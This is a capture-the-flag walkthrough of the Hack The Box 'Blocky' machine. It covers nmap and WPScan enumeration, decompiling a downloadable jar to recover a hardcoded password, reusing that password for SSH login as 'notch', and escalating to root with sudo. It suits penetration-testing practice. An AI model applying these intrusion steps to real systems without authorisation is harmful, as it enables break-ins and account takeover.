# Walkthrough: Blocky HTB Machine
!{Blocky.png}
**Target IP Address**: `10.10.10.37`  
**Difficulty**: Easy  
**Tools Used**: Nmap, WPScan, JD-GUI, SSH

## Step 1: Initial Enumeration

To start, I performed an Nmap scan to identify open ports and services.

```bash
nmap -sC -sV 10.10.10.37
```

### Nmap Results:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-03 14:39 IST
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 5.05% done; ETC: 14:40 (0:00:38 remaining)
Nmap scan report for 10.10.10.37
Host is up (0.071s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE  SERVICE VERSION
21/tcp   open   ftp     ProFTPD 1.3.5a
22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp   open   http    Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://blocky.htb
|_http-server-header: Apache/2.4.18 (Ubuntu)
8192/tcp closed sophos
Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.36 seconds
```

The HTTP service redirected to `http://blocky.htb`, suggesting a hostname requirement.

### Update Hosts File

```bash
sudo nano /etc/hosts
```

Add the following entry:
```
10.10.10.37 blocky.htb
```

## Step 2: Web Enumeration

With the website active, I used WPScan to further enumerate the WordPress site and discovered the user .

```
[+] notch
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blocky.htb/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

## Step 3: Decompiling BlockyCore.jar

A downloadable `.jar` file was available on the website. I used `JD-GUI` to analyze the `BlockyCore.jar` file for sensitive information.

The code snippet revealed the following:

```
public String sqlUser = "root";
public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
```

These credentials hinted at possible SSH access.

## Step 4: Gaining Access via SSH

Using the discovered credentials, I logged into SSH with the username `notch`:

```bash
ssh notch@10.10.10.37
```

**Password**: `8YsqfCTnvxAUeduzjNSXe22`

This granted me user-level access.

## Step 5: Privilege Escalation

With user access, I executed `sudo -i` to escalate privileges:

```bash
sudo -i
```
After being promoted to root, we can get a root flag.
